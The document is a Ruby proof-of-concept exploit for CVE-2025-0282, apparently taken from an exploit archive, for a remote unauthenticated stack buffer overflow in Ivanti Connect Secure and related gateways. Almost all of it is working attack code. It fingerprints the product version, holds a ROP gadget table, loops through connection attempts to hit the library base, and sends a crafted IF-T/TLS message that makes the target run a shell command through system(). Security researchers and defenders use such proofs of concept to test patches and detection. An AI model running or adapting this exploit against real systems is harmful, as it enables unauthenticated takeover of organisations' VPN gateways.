@@ -1,0 +1,219 @@
+id: 39875
+date: 01/16/2025
+title: Ivanti Buffer Overflow Proof of Concept Exploit
+author: sfewer-r7
+cves: CVE-2025-0282
+
+# PoC for CVE-2025-0282, a remote unauthenticated stack based buffer overflow affecting 
+# Ivanti Connect Secure, Ivanti Policy Secure, and Ivanti Neurons for ZTA gateways.
+#
+# Based upon the exploitation strategy published by watchTowr (https://labs.watchtowr.com/exploitation-walkthrough-and-techniques-ivanti-connect-secure-rce-cve-2025-0282).
+#
+# Usage: ruby CVE-2025-0282.rb -t 192.168.86.111 -p 443
+#
+# Stephen Fewer (Rapid7) - January 16, 2025.
+
+require 'base64'
+require 'socket'
+require 'openssl'
+require 'httparty'
+require 'optparse'
+
+HTTParty::Basement.default_options.update(verify: false)
+
+def log(txt)
+	$stdout.puts txt
+end
+
+def rand_string(len)
+	(0...len).map {'a'.ord + rand(26)}.pack('C*')
+end
+
+def send_http_data(s, data, verbose=false)
+
+	s.write(data)
+
+	result = ''
+
+  content_length = 0
+
+	while line = s.gets
+    p line if verbose
+
+    m = line.match(/Content-length: (\d+)\r\n/)
+    if m
+      content_length = m[1].to_i
+    end
+
+		result << line
+
+    if line == "\r\n" && content_length
+      break if content_length <= 0
+
+      content = s.read(content_length)
+
+      p content if verbose
+
+      result << content
+      break
+    end
+	end
+
+	return result
+end
+
+# https://github.com/BishopFox/CVE-2025-0282-check/blob/main/scan-cve-2025-0282.py#L6
+def get_productversion(ip,port)
+  res = HTTParty.get("https://#{ip}:#{port}/dana-na/auth/url_admin/welcome.cgi?type=inter")
+
+  return nil unless res&.code == 200
+
+  m = res.body.match(/name="productversion"\s+value="(\d+.\d+.\d+.\d+)"/i)
+
+  return nil unless m&.length == 2
+
+  m[1]
+end
+
+def hax(ip, port)
+
+    log "[+] Targeting #{ip}:#{port}"
+
+    productversion = get_productversion(ip, port)
+
+    if productversion.nil?
+      log "[-] Could not get product version for #{ip}:#{port}"
+      return
+    end
+
+    log "[+] Detected version #{productversion}"
+
+    # Note: All gadgets are from /home/lib/libdsplibs.so
+    targets= {
+      # 22.7r2.4 b3597 (libdsplibs.so sha1: f31a3cc442df5178b37ea539ff418fec9bf3404f)
+      '22.7.2.3597' => {
+        padding_to_vftable: 2288,
+        vftable_gadget_offset: 0x00934365 + 2,
+        padding_to_next_frame: 2934,
+        offset_to_got_plt: 0x00157c000,
+        gadget_inc_ebx_ret: 0x01338373,
+        gadget_mov_eax_esp_retn_c: 0x00ca2e84,
+        gadget_add_eax_8_ret: 0x007a040c,
+        gadget_mov_esp_eax_call_system: 0x004f0df3,
+      }
+    }
+
+    target = targets[productversion]
+
+    throw "No target for #{productversion}" unless target
+
+    log "[#{Time.now}] Starting..."
+
+    attempt = 0
+
+    0.upto(2048) do
+
+      s = TCPSocket.open(ip, port)
+
+      if port == 443
+        ctx = OpenSSL::SSL::SSLContext.new
+
+        ctx.set_params(verify_mode: OpenSSL::SSL::VERIFY_NONE)
+
+        s = OpenSSL::SSL::SSLSocket.new(s, ctx).tap do |socket|
+          socket.sync_close = true
+          socket.connect
+        end
+      end
+
+      body  = "GET / HTTP/1.1\r\n"
+      body << "Host: #{ip}:#{port}\r\n"
+      body << "User-Agent: AnyConnect-compatible OpenConnect VPN Agent v9.12-188-gaebfabb3-dirty\r\n"
+      body << "Content-Type: EAP\r\n"
+      body << "Upgrade: IF-T/TLS 1.0\r\n"
+      body << "Content-Length: 0\r\n"
+      body << "\r\n"
+
+      res1 = send_http_data(s, body)
+
+      unless res1.include? '101 Switching Protocols'
+        throw "bad response1"
+      end
+
+      data = [0, 1, 2, 2].pack('C*') # min version 1, max version 2, preferred version 2.
+
+      body = [
+        0x00005597, # VENDOR_TCG
+        0x00000001, # IFT_VERSION_REQUEST
+        data.length + 16,
+        0 # seq id
+      ].pack('NNNN') + data
+
+      s.write(body)
+
+      attempt += 1
+
+      libdsplibs_base = 0xf6492000
+
+      buffer  = ('C' * target[:padding_to_vftable])
+      buffer += [libdsplibs_base + target[:vftable_gadget_offset]].pack('V') # ptr to address + 0x48, to ptr, to gadget
+      buffer += ('A' * target[:padding_to_next_frame])
+      buffer += [libdsplibs_base + target[:offset_to_got_plt] - 1].pack('V') # ebx == got.plt - 1
+      buffer += [0xCAFEBEEF].pack('V') # esi
+      buffer += [0xCAFEBEEF].pack('V') # edi
+      buffer += [0xCAFEBEEF].pack('V') # ebp
+      buffer += [libdsplibs_base + target[:gadget_inc_ebx_ret]].pack('V') # inc ebx; ret;
+      buffer += [libdsplibs_base + target[:gadget_mov_eax_esp_retn_c]].pack('V') # mov eax, esp; ret 0xc;
+      buffer += [libdsplibs_base + target[:gadget_add_eax_8_ret]].pack('V') # add eax, 8; ret;
+      buffer += [0xCAFEBEEF].pack('V')
+      buffer += [0xCAFEBEEF].pack('V')
+      buffer += [0xCAFEBEEF].pack('V')
+      buffer += [libdsplibs_base + target[:gadget_add_eax_8_ret]].pack('V') # add eax, 8; ret;
+      buffer += [libdsplibs_base + target[:gadget_add_eax_8_ret]].pack('V') # add eax, 8; ret;
+      buffer += [libdsplibs_base + target[:gadget_add_eax_8_ret]].pack('V') # add eax, 8; ret;
+      buffer += [libdsplibs_base + target[:gadget_add_eax_8_ret]].pack('V') # add eax, 8; ret;
+      buffer += [libdsplibs_base + target[:gadget_mov_esp_eax_call_system]].pack('V') # mov [esp], eax; call system;
+      buffer += [0xCAFEBEEF].pack('V')
+      buffer += "touch /var/tmp/haxor_#{attempt}; #".gsub(' ', '${IFS}')
+
+      ["\x00"].each do |bad_char|
+        throw "buffer cannot have bad char #{bad_char.chr}" if buffer.include? bad_char
+      end
+
+      data = "clientHostName=abcdefgh clientIp=127.0.0.1 clientCapabilities=#{buffer}\n\x00"
+
+      body = [
+        0x00000a4c, # VENDOR_JUNIPER
+        0x00000088, # ?
+        data.length + 16,
+        1 # seq id
+      ].pack('NNNN') + data
+
+      log "[#{Time.now}] Triggering ##{attempt}..."
+      s.write(body)
+    rescue Errno::ECONNREFUSED, Errno::ECONNRESET, Errno::ECONNABORTED
+      sleep(1)
+      next
+    end
+end
+
+target_ip = nil
+target_port = 443
+
+OptionParser.new do |opts|
+  opts.banner = "Usage: CVE-2025-0282.rb [options]"
+
+  opts.on("-t", "--taget=TARGET", "target IP") do |v|
+    target_ip = v
+  end
+
+  opts.on("-p", "--port=PORT", "target port") do |v|
+    target_port = v.to_i
+  end
+end.parse!
+
+throw "set target IP via -t argument" unless target_ip
+
+hax(target_ip, target_port)
+
+#  0day.today [2025-01-20]  #
